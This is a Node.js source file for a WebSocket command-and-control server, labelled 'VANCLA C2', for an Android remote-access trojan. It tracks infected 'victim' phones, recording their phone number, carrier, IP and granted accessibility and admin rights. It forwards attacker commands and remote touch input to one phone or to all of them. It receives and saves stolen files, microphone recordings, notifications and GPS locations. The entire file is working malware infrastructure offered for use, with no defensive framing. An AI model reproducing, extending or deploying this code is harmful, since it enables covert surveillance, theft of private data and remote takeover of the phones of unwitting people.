const WebSocket = require('ws');
const http      = require('http');
const fs        = require('fs');
const path      = require('path');

const PORT       = process.env.PORT || 8080;
const UPLOAD_DIR = path.join(__dirname, 'received');
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
        status: 'VANCLA C2 ONLINE',
        victims: victims.size,
        attackers: attackers.size,
        time: new Date().toISOString()
    }));
});

const wss = new WebSocket.Server({ server });

// Multi-victim storage
const victims   = new Map(); // id → { ws, info, id, connectedAt }
const attackers = new Set(); // Set of attacker WebSocket connections
let   vidCounter = 0;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

// ── BROADCAST ─────────────────────────────────────────
function broadcastAttackers(obj) {
    const json = JSON.stringify(obj);
    attackers.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) ws.send(json);
    });
}

function getVictimList() {
    return Array.from(victims.values()).map(v => ({
        id:          v.id,
        model:       v.info.model   || 'Unknown',
        android:     v.info.android || '—',
        battery:     v.info.battery != null ? v.info.battery : '—',
        charging:    v.info.charging || false,
        network:     v.info.network  || '—',
        carrier:     v.info.carrier  || '—',
        phone:       v.info.phone    || '—',
        ip:          v.info.ip       || '—',
        screen:      v.info.screen   || '—',
        connectedAt: v.connectedAt,
        notif:       v.info.notif    || false,
        access:      v.info.access   || false,
        admin:       v.info.admin    || false,
    }));
}

// ── CONNECTION ────────────────────────────────────────
wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.role    = null;
    ws.vicId   = null;

    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (data) => {
        let msg;
        try { msg = JSON.parse(data.toString()); }
        catch(_) { return; }

        // ── HANDSHAKE ──────────────────────────────────
        if (msg.type === 'attacker_hello') {
            ws.role = 'attacker';
            attackers.add(ws);
            log(`Attacker connected (${attackers.size} total)`);
            ws.send(JSON.stringify({ type: 'ack', role: 'attacker' }));
            // Send current victim list immediately
            ws.send(JSON.stringify({ type: 'victim_list', victims: getVictimList() }));
            return;
        }

        if (msg.type === 'victim_hello') {
            ws.role = 'victim';
            const id = 'V' + (++vidCounter).toString().padStart(3, '0');
            ws.vicId = id;
            const victim = { ws, id, info: msg, connectedAt: new Date().toLocaleTimeString() };
            victims.set(id, victim);
            log(`Victim connected: [${id}] ${msg.model || 'Unknown'} Android ${msg.android || '?'}`);
            ws.send(JSON.stringify({ type: 'ack', role: 'victim', id }));
            // Notify all attackers
            broadcastAttackers({ type: 'victim_list', victims: getVictimList() });
            broadcastAttackers({ type: 'victim_online', id, status: true, data: { ...msg, id } });
            return;
        }

        // ── ATTACKER → VICTIM ─────────────────────────
        if (ws.role === 'attacker') {
            const targetId = msg.targetId;

            if (msg.type === 'command' || msg.type === 'touch') {
                if (!targetId) { ws.send(JSON.stringify({ type: 'error', msg: 'targetId required' })); return; }
                const victim = victims.get(targetId);
                if (!victim || victim.ws.readyState !== WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: 'error', msg: 'Victim offline', targetId }));
                    return;
                }
                victim.ws.send(JSON.stringify(msg));
                return;
            }

            if (msg.type === 'chat') {
                const victim = victims.get(targetId);
                if (victim && victim.ws.readyState === WebSocket.OPEN) {
                    victim.ws.send(JSON.stringify(msg));
                }
                return;
            }

            if (msg.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
                return;
            }

            // Broadcast command to all victims if no targetId
            if (!targetId) {
                victims.forEach(v => {
                    if (v.ws.readyState === WebSocket.OPEN) v.ws.send(JSON.stringify(msg));
                });
            }
            return;
        }

        // ── VICTIM → ATTACKER ─────────────────────────
        if (ws.role === 'victim') {
            // Tag data with source victim ID
            const tagged = { ...msg, sourceId: ws.vicId };
            const json   = JSON.stringify(tagged);

            // Persist certain data types
            if (msg.type === 'file_data' && msg.data) {
                saveFile(ws.vicId, msg.path || 'file', msg.data);
            }
            if (msg.type === 'audio_chunk' && msg.data) {
                const fname = `${ws.vicId}_audio_${Date.now()}.3gp`;
                saveFile(ws.vicId, fname, msg.data);
                log(`Audio saved: ${fname}`);
            }
            if (msg.type === 'notif' && msg.data) {
                log(`[${ws.vicId}] Notif: ${msg.data.title || ''}`);
            }
            if (msg.type === 'location' && msg.data) {
                log(`[${ws.vicId}] Loc: ${msg.data.lat}, ${msg.data.lng}`);
                // Update victim info with latest location
                const v = victims.get(ws.vicId);
                if (v) v.lastLoc = msg.data;
            }

            // Chat from victim → all attackers
            if (msg.type === 'chat' && msg.sender === 'victim') {
                broadcastAttackers({ type: 'chat_vic', text: msg.text, sourceId: ws.vicId });
                return;
            }

            // Forward everything else to all attackers
            broadcastAttackers(tagged);
            return;
        }
    });

    ws.on('close', () => {
        if (ws.role === 'attacker') {
            attackers.delete(ws);
            log(`Attacker disconnected (${attackers.size} remaining)`);
        }
        if (ws.role === 'victim' && ws.vicId) {
            victims.delete(ws.vicId);
            log(`Victim [${ws.vicId}] disconnected`);
            broadcastAttackers({ type: 'victim_list', victims: getVictimList() });
            broadcastAttackers({ type: 'victim_online', id: ws.vicId, status: false });
        }
    });

    ws.on('error', err => log(`WS Error: ${err.message}`));
});

// ── KEEP ALIVE ────────────────────────────────────────
setInterval(() => {
    wss.clients.forEach(ws => {
        if (!ws.isAlive) { ws.terminate(); return; }
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

// ── FILE SAVE ─────────────────────────────────────────
function saveFile(vicId, filePath, base64) {
    try {
        const dir = path.join(UPLOAD_DIR, vicId);
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const name = path.basename(filePath) || `file_${Date.now()}`;
        fs.writeFileSync(path.join(dir, name), Buffer.from(base64, 'base64'));
    } catch (e) { log(`Save error: ${e.message}`); }
}

server.listen(PORT, '0.0.0.0', () => {
    log(`VANCLA C2 listening on port ${PORT}`);
    log(`Mode: ${process.env.RAILWAY_ENVIRONMENT ? 'Railway' : 'Local'}`);
});
